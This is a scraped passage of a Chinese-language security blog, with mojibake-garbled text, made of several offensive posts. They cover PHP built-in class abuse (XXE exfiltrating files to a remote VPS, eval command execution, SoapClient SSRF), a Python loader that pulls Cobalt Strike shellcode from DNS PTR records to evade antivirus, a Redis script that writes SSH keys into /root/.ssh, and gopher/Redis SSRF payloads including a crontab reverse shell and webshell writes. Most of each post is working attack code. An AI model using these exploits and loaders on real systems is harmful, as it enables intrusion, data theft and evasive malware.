SimpleXMLElementSimpleXMLElement::__contruct Libxml2.9åé»˜è®¤ä¸å…è®¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯ä»¥é€šè¿‡å‡½æ•°å‚æ•°LIBXML_NOENTå¼€å¯è§£æ åˆ©ç”¨ æ ¹æ®å¯æ§æ–¹å¼é€‰æ‹© æœ¬åœ°è¯»å–123456789101112131415161718192021&lt;?phpclass NotFound{ function __construct() { die('404'); }}spl_autoload_register( function ($class){ new NotFound(); });$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname)){ $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';} 123456789101112&lt;?php$a='&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;';$a=new SimpleXMLElement($a,2);echo $a;?&gt; éœ€è¦ä¸¤ä¸ªå‚æ•°å¯æ§ åˆ©ç”¨SimpleXMLElementæ„é€ ä¸€ä¸ªXMLæ–‡æ¡£ï¼Œä»è€Œåˆ©ç”¨ XXEè¯»å–æ–‡ä»¶ ã€‚å½“æ–‡ä»¶ä¸­æœ‰&lt; &gt; &amp; â€˜ â€œ è¿™5ä¸ªç¬¦å·æ—¶ï¼Œä¼šå¯¼è‡´XMLæ–‡ä»¶è§£æé”™è¯¯ï¼Œæ‰€ä»¥è¦åˆ©ç”¨php://filterï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶å†…å®¹ç»è¿‡ base64ç¼–ç  åè¾“å‡ºã€‚å¦‚ï¼š 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot; &gt;]&gt;&lt;a&gt;&amp;name;&lt;/a&gt; æœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ä»¥ä¸‹ï¼Œåœ¨urlä¸­ä¸èƒ½ç›´æ¥æ‰“&amp; ä¼šè¢«æ­§ä¹‰ï¼Œæˆ‘ä»¬ä½¿ç”¨ %26 è¿˜æœ‰å°±æ˜¯resource=åé¢ä¸éœ€è¦å¼•å·åŒ…è£¹ã€‚ç¬¬äºŒä¸ªå‚æ•°é‡Œçš„2å¯¹åº”çš„æ¨¡å¼æ˜¯ LIBXML_NOENTã€‚payload: 1?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;/a&gt;&amp;param2=2 è‡³äºä¸ºä»€ä¹ˆç¬¬äºŒä¸ªå‚æ•°ä¸ºäºŒï¼Œå®é™…ä¸Šè¿™é‡Œ2å¯¹åº”çš„æ¨¡å¼æ˜¯ LIBXML_NOENT ï¼Œæˆ‘ä»¬ç›´æ¥è®°ä½ç”¨äºŒå§ä¸ç„¶å°±æ˜¯ç›´æ¥ç™¾åº¦ã€‚ è¿œç¨‹è¯»å–å¿…é¡»æœ‰ä¸‰ä¸ªå‚æ•°å¯æ§ï¼Œæ‰èƒ½è¯»å–è¿œç¨‹xmlæ–‡ä»¶ã€‚ 123456789101112131415161718192021222324// index.php&lt;?phpclass NotFound{ function __construct() { die('404'); }}spl_autoload_register( function ($class){ new NotFound(); });$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;$param3 = isset($_GET['param3']) ? $_GET['param3'] : null;if(class_exists($classname)){ //$newclass = new $classname($param,$param2); $newclass = new $classname($param,$param2,$param3); var_dump($newclass);// foreach ($newclass as $key=&gt;$value)// echo $key.'=&gt;'.$value.'&lt;br&gt;';} SimpleXMLElementè¯»å–è¿œç¨‹æ–‡ä»¶evil.xml-&gt;evil.xmlè¯·æ±‚send.xmlï¼Œå®é™…æ‰§è¡Œçš„æ˜¯send.xml send.phpè´Ÿè´£ä¿å­˜ç»“æœï¼Œåœ¨vpsä¸Šæ„é€ å¦‚ä¸‹evil.xmlã€send.xmlå’Œsend.phpè¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚ evil.xmlï¼š 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &quot;http://47.xxx.xxx.72/send.xml&quot;&gt;%remote;%all;%send;]&gt; send.xmlï¼š 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.111.129/send.php?file=%file;'&gt;&quot;&gt; send.phpï¼š 123&lt;?php file_put_contents(&quot;result.txt&quot;, $_GET['file']) ;?&gt; ç„¶ååœ¨urlä¸­æ„é€ å¦‚ä¸‹ï¼š 1/show.php?module=SimpleXMLElement&amp;args[]=http://47.xxx.xxx.72/evil.xml&amp;args[]=2&amp;args[]=true æ¥æ”¶åˆ°æ•°æ® Error/Exception__toString Error1234&lt;?php$a=new Error('&lt;script&gt;alert(1)&lt;/script&gt;');echo $a;?&gt; getmessagegetMessageå¯ç›´æ¥ä¼ å…¥evalæ‰§è¡Œå‘½ä»¤ï¼Œå°†è½¬æ¢æˆhexæ‰§è¡Œ 1234$a = new Error('?');$c = &quot;getMessage&quot;;$d = &quot;eval(phpinfo())&quot;;eval(&quot;\\$a-&gt;$c($d);&quot;); 1eval(hex2bin(&quot;6563686f20706928293b&quot;)) 1234567&lt;?phpecho bin2hex('phpinfo();');$a=new Error();$a-&gt;getMessage(eval(hex2bin(&quot;706870696e666f28293b&quot;)));////echo bin2hex('phpinfo()');?&gt; SoapClientphpå­˜åœ¨å†…ç½®ç±»SoapClient::__callï¼Œå­˜åœ¨å¯ä»¥è§¦å‘__callæ–¹æ³•æ—¶ï¼Œå¯ä»¥è¿›è¡Œssrf è¿›è¡ŒSSRF é…åˆCRLF 1234567891011121314151617&lt;?php$target = 'http://192.168.111.129:5555/path';$post_string = 'data=something';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=my_session');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; æˆåŠŸæ¥æ”¶åˆ°æŠ¥æ–‡ DirectoryIteratoréå†ç›®å½• 1234567891011121314151617181920212223242526272829303132DirectoryIterator extends SplFileInfo implements SeekableIterator { /* æ–¹æ³• */ public __construct ( string $path ) public current ( ) : DirectoryIterator public getATime ( ) : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename ( ) : string public getGroup ( ) : int public getInode ( ) : int public getMTime ( ) : int public getOwner ( ) : int public getPath ( ) : string public getPathname ( ) : string public getPerms ( ) : int public getSize ( ) : int public getType ( ) : string public isDir ( ) : bool public isDot ( ) : bool public isExecutable ( ) : bool public isFile ( ) : bool public isLink ( ) : bool public isReadable ( ) : bool public isWritable ( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string // ä»¥å­—ç¬¦ä¸²å½¢å¼è·å–æ–‡ä»¶å public valid ( ) : bool} FilesystemIteratoråˆ—å‡ºç›®å½•ä¸‹æ–‡ä»¶ 123&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir; SplFileInfoè¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ·»åŠ å…¶ä»–å‚æ•°åªèƒ½è¯»å–ç¬¬ä¸€è¡Œ 123&lt;?php$context = new SplFileObject('/etc/passwd');echo $context; å¯ä»¥é€šè¿‡éå†çš„æ–¹å¼è¯»å–æ‰€æœ‰å†…å®¹ 12345&lt;?php$context = new SplFileObject('/etc/passwd');foreach($context as $f){ echo($f);} ReflectionFunctioninvokeArgs å¯æ‰§è¡Œå‘½ä»¤ 12345678910&lt;?php$a=new ReflectionFunction('call_user_func');$a-&gt;invokeArgs(array('system','whoami'));$a=new ReflectionFunction('system');$a-&gt;invokeArgs(array('whoami'));?&gt; ä¾‹å­ 123456789101112131415161718192021222324252627&lt;?phpfunction waf($s){ return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i',&quot;NepnEpneP&quot;, $s);}if(isset($_GET['a'])){ $_ = waf($_GET['a']); $__ = waf($_GET['b']); $a = new $_($__);}else{ $a = new Error('?');}if(isset($_GET['c']) &amp;&amp; isset($_GET['d'])){ $c = waf($_GET['c']); $d = waf($_GET['d']); eval(&quot;\\$a-&gt;$c($d);&quot;);}else{ $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;);}//$a = new Error('?');//$c = &quot;getMessage&quot;;//$d = &quot;eval(phpinfo())&quot;;//eval(&quot;\\$a-&gt;$c($d);&quot;);?&gt;","link":"/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"},{"title":"pythonåˆ©ç”¨dnsçš„PTRè®°å½•åŠ è½½shellcode","text":"DNSè§£æä¸­çš„PTRè®°å½•è´Ÿè´£åå‘è§£æï¼Œå³æŠŠIPåœ°å€è§£æä¸ºåŸŸåã€‚åˆ©ç”¨PTRè®°å½•ä¿å­˜shellcodeï¼Œç„¶åé€šè¿‡dnsè¯·æ±‚è·å–åˆ°shellcodeåæ‰§è¡Œï¼Œæ¥è¾¾åˆ°å…æ€çš„ç›®çš„ã€‚ PTRè®°å½•çš„ä¸¤ä¸ªç‰¹æ€§ 1.ä¸åŒºåˆ†å¤§å°å†™ï¼Œdnsè§£æç»“æœç»Ÿä¸€è½¬ä¸ºå°å†™ 2.æ ¼å¼ä¸å®šï¼Œå¯ä»¥å‡ºç°åŒ…æ‹¬â€œ!@#$%^&amp;*()_+=/?&lt;&gt;â€åœ¨å†…çš„å„ç§ç‰¹æ®Šå­—ç¬¦å’Œç©ºæ ¼ï¼Œåªæœ‰åæ–œæ â€œ\\â€ä¼šè¢«è¿‡æ»¤ã€‚ åœ¨æœ¬åœ°æœåŠ¡å™¨æ·»åŠ  è¿›è¡Œåå‘è§£ææŸ¥è¯¢ï¼Œ192.168.111.135ä¸ºDNSæœåŠ¡å™¨çš„ip 1nslookup -qt=ptr 192.168.111.1 192.168.111.135 å¯ä»¥çœ‹åˆ°æˆåŠŸè·å–äº†ä¹‹å‰è®¾ç½®å¥½çš„å†…å®¹ï¼Œå¯ä»¥æŠŠè¿™ä¸€æ®µä»£ç æ›¿æ¢æˆshellcode ç”¨csç”Ÿæˆshellcodeï¼Œç”±äºshellcodeæœ¬è´¨æ˜¯ä¸€ä¸²åå…­è¿›åˆ¶çš„æœºå™¨ç ï¼Œå› æ­¤å¯ä»¥å…ˆå»æ‰å‰é¢çš„è½¬ä¹‰å­—ç¬¦\\xå¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼ä¿å­˜åœ¨PTRè®°å½•ä¸­ï¼Œæ‰§è¡Œæ—¶å†è½¬ä¸ºåå…­è¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿç¬¦åˆPTRè®°å½•ä¸­ä¸èƒ½å‡ºç°åæ–œæ çš„è§„åˆ™ åˆ†å‰²shellcodeï¼Œæ¯ä¸ªipå¯¹åº”çš„PTRè®°å½•ä¿å­˜ä¸€è¡Œï¼Œè¿™é‡Œæ·»åŠ çš„IPä¸º192.168.111.20-192.168.111.59 å»æ‰æ‰€æœ‰çš„\\xï¼ŒæŠŠå®ƒä»¬åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†æŒ‰ç…§é¡ºåºæ·»åŠ åˆ°PTRè®°å½•ä¸­ åªéœ€è¦æŒ‰ç…§é¡ºåºå¯¹ç›¸åº”çš„ipå‘èµ·è¯·æ±‚å³å¯è·å¾—éƒ¨åˆ†shellcode åˆ©ç”¨pythonçš„dnspythonåº“è·å–PTRè®°å½•ä¸­çš„shellcodeï¼Œç„¶ååˆ†é…å†…å­˜æ‰§è¡Œ 123456789101112131415161718192021222324252627282930313233343536import dns.resolverimport dns.reversenameimport ctypesdnsip='192.168.111.135'def LoadshellCode(shellcode): #æ‰§è¡Œshellcode ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode))) handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))def requestptr(dnsip,ipnum): #è·å–PTRè®°å½• ipaddr='192.168.111.%d' %ipnum #æ·»åŠ çš„PTRè®°å½•ä¸­ä¸»æœºipåœ°å€çš„Cæ®µåœ°å€ ip=dns.reversename.from_address(ipaddr) my_resolver = dns.resolver.Resolver() my_resolver.nameservers = [dnsip] answer = my_resolver.resolve(ip,'PTR') recvptr=str(answer[0]).strip('.') return recvptrdef str2hex(shellcodedemo): #å°†å¾—åˆ°çš„shellcodeè½¬ä¸ºåå…­è¿›åˆ¶ s='' s1=b'' for i in range(int(len(shellcodedemo))): if i % 2 == 0: s1 += bytes.fromhex(shellcodedemo[i:i + 2]) return bytearray(s1)if __name__=='__main__': s='' for i in range(20,60): #æ ¹æ®æ·»åŠ çš„ipèŒƒå›´è¿›è¡Œè¯·æ±‚ï¼Œ192.168.111.20-192.168.111.59å¯¹åº”range(20,60) s+=requestptr(dnsip,i) LoadshellCode(str2hex(s)) ä½¿ç”¨pyinstalleræ‰“åŒ…æˆexeæ–‡ä»¶ï¼Œ 1pyinstaller -F -w dnsptrshellcode.py pyinstalleré»˜è®¤ä¸€å¹¶æ‰“åŒ…æ‰€æœ‰åº“ï¼Œé€ æˆç”Ÿæˆçš„exeæ–‡ä»¶ä½“ç§¯è¿‡å¤§ï¼Œå¯ä»¥åˆ©ç”¨è™šæ‹Ÿç¯å¢ƒæ‰“åŒ…çš„æ–¹å¼å‹ç¼©ä¸‹ä½“ç§¯ï¼Œå‹ç¼©åçš„ä½“ç§¯å¤§æ¦‚ä¸º3Må·¦å³ https://blog.csdn.net/p1967914901/article/details/109706449 æ‹¿åˆ°beacon å¯ä»¥ç»•è¿‡360ï¼Œä½†è¢«ç«ç»’æŸ¥æ€ githubåœ°å€ï¼šhttps://github.com/sp4zcmd/DnsPTRShellcodeLoader å‚è€ƒï¼š https://www.freebuf.com/articles/network/185324.html","link":"/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"},{"title":"pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬","text":"pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬ç¯å¢ƒé…ç½®1234# wget http://download.redis.io/releases/redis-6.0.8.tar.gz# tar xzf redis-6.0.8.tar.gz# cd redis-6.0.8# make æ‰§è¡Œå®Œ make å‘½ä»¤åï¼Œredis-6.0.8 çš„ src ç›®å½•ä¸‹ä¼šå‡ºç°ç¼–è¯‘åçš„ redis æœåŠ¡ç¨‹åº redis-serverï¼Œè¿˜æœ‰ç”¨äºæµ‹è¯•çš„å®¢æˆ·ç«¯ç¨‹åº redis-cliï¼š ä¸‹é¢å¯åŠ¨ redis æœåŠ¡ï¼š 12# cd src# ./redis-server ä¿®æ”¹redis.confï¼Œå…ˆæ³¨é‡Šæ‰bind 127.0.0.1è¿™ä¸€è¡Œï¼Œå…è®¸è¿œç¨‹ç™»é™†ï¼ŒåŒæ—¶å…³é—­ä¿æŠ¤æ¨¡å¼ ä½¿ç”¨ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶å¯åŠ¨ 12# cd src# ./redis-server ../redis.conf åˆ©ç”¨è¿‡ç¨‹ä¿®æ”¹æ•°æ®åº“é»˜è®¤è·¯å¾„ä¸º/root/.sshï¼Œé»˜è®¤ç¼“å­˜æ–‡ä»¶ä¸ºauthorized.keysï¼ŒæŠŠç›®æ ‡ä¸»æœºç¼“å­˜çš„å…¬é’¥ä½œä¸ºvalueä¿å­˜åœ¨authorized.keysæ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±åœ¨æœåŠ¡å™¨ç«¯/root/.sshä¸‹ç”Ÿæˆäº†ä¸€ä¸ªæˆæƒçš„key 1.æœ¬åœ°ä¸»æœºç”Ÿæˆå¯†é’¥key 1ssh-keygen -t rsa 2.åœ¨ç›®å½•/root/.sshä¸‹æŸ¥çœ‹ç”Ÿæˆç»“æœï¼Œå¹¶æŠŠå…¬é’¥å¯¼å…¥txtæ–‡ä»¶ä¸­ 1234cd /root/.sshls(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txtcat key.txt 3.æŠŠç”Ÿæˆçš„å…¬é’¥å¯¼å…¥Redisç¼“å­˜ä¸­ 1cat /root/key.txt | redis-cli -h xx.xx.xx.xx 4.è¿æ¥åˆ°ç›®æ ‡ä¸»æœºï¼Œæ›´æ”¹é…ç½®æ–‡ä»¶è·¯å¾„ä¸º/root/.sshï¼Œè®¾ç½®æ–‡ä»¶åç§°ä¸ºauthorized-keys 12345redis-cli -h xx.xx.xx.xxconfig set dir /root/.sshConfig set dbfilename authorized_keyssave 5.sshè¿æ¥åˆ°ç›®æ ‡ä¸»æœº 1ssh xx.xx.xx.xx ç¼–å†™pythonè„šæœ¬githubåœ°å€ï¼šhttps://github.com/sp4zcmd/SimpleRedisScanner 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import socketimport redisimport sysdef Usage(): print('RedisScanner.py 127.0.0.1 key.txt')def Scan(ip): payload=&quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(10) try: s.connect((ip, 6379)) s.sendall(payload.encode()) recvdata=s.recv(1024).decode() if 'redis_version' in recvdata: print('[+] %s is vulnerable ' %ip) #print(recvdata) return True except: print('[-] %s is not vulnerable ' %ip) return False passdef WriteSSHKeygen(ip,sshkey): try: r = redis.StrictRedis(host=ip, port=6379, db=0, socket_timeout=2) r.flushall() r.set('crackit', sshkey) r.config_set('dir', '/root/.ssh/') r.config_set('dbfilename', 'authorized_keys') r.save() print('[+] Write SSHkeygen successful') except: print('[-] Write SSHkeygen Failed') passif __name__=='__main__': if(len(sys.argv)==3): ip=sys.argv[1] sshkeyfile=sys.argv[2] try: with open(sshkeyfile, 'r') as f: sshkey = f.read() except: print('Read SSHkeygen Failed') pass if Scan(ip): WriteSSHKeygen(ip, sshkey) else: Usage() è¿è¡Œæµ‹è¯• å†™å…¥æˆåŠŸ æˆåŠŸè¿æ¥","link":"/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/"},{"title":"ssrfä¸­gopher+redisçš„åˆ©ç”¨æ€»ç»“","text":"crontabåªèƒ½åœ¨Centosä¸Šä½¿ç”¨ï¼ŒåŸå› ï¼š 1.redisé»˜è®¤å†™å…¥æ–‡ä»¶çš„æƒé™ä¸º644ï¼Œè€Œubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/crontabs/&lt;username&gt;æƒé™å¿…é¡»æ˜¯600ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/&lt;username&gt;æƒé™644ä¹Ÿå¯æ‰§è¡Œã€‚ 2.å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ 3.ä¸åŒç³»ç»Ÿä¸­crontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/&lt;username&gt;Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/crontabs/&lt;username&gt;ï¼ŒCentoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰/etc/crontab ï¼Œé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚ payload 12345set xxx &quot;\\n\\n* * * * * bash -i&gt;&amp; /dev/tcp/10.133.164.81/6666 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave å†™å…¥å…¬é’¥å‘/root/.sshä¸­å†™å…¥å…¬é’¥å³å¯ç”¨sshç™»é™†æœåŠ¡å™¨ï¼Œé«˜ç‰ˆæœ¬rediså°‘æœ‰rootæƒé™ï¼Œéš¾ä»¥åˆ©ç”¨ ç”Ÿæˆç§é’¥ 1ssh-keygen -t rsa rediså‘½ä»¤ 123456flushallset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali'config set dir /root/.ssh/config set dbfilename authorized_keyssave å†™å…¥webshellæ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•ï¼Œä»¥[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMeä¸ºä¾‹ è®¿é—®index.phpï¼Œè¿‡æ»¤127.0.0.1ï¼Œä½¿ç”¨http://0.0.0.0ç»•è¿‡ï¼Œæç¤ºè¦è®¿é—®hint.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpfunction check_inner_ip($url){ $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16;}function safe_request_url($url){ if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); }}if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); }}else{ highlight_file(__FILE__);}// Please visit hint.php locally.?&gt; è¯»å–hint.php 1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=http://0.0.0.0/hint.php hint.php 12345678&lt;?phpif($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ highlight_file(__FILE__);}if(isset($_POST['file'])){ file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);}&quot; åˆ©ç”¨dict://è®¿é—®6379ç«¯å£ï¼Œå­˜åœ¨redisï¼Œå‰é¢ç»™å‡ºäº†å¯†ç ä¸ºroot 1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=dict://0.0.0.0:6379 åˆ©ç”¨gopheråè®®ï¼Œç”Ÿæˆpayload 123C:\\Users\\dell\\Desktop&gt; python2 G:\\å·¥å…·\\ssrfå·¥å…·\\gopherwriteshell2.pygopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A pythonè„šæœ¬ 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;10.0.231.11&quot; // è¿è¡Œæœ‰redisçš„ä¸»æœºipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload åˆ©ç”¨gopheråè®®ï¼Œç”Ÿæˆpayload æŠŠç”Ÿæˆçš„payloadè¿›è¡Œurlç¼–ç  1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%33%32%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%32%63%61%74%25%32%30%2f%66%6c%61%67%25%32%32%25%32%39%25%33%42%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%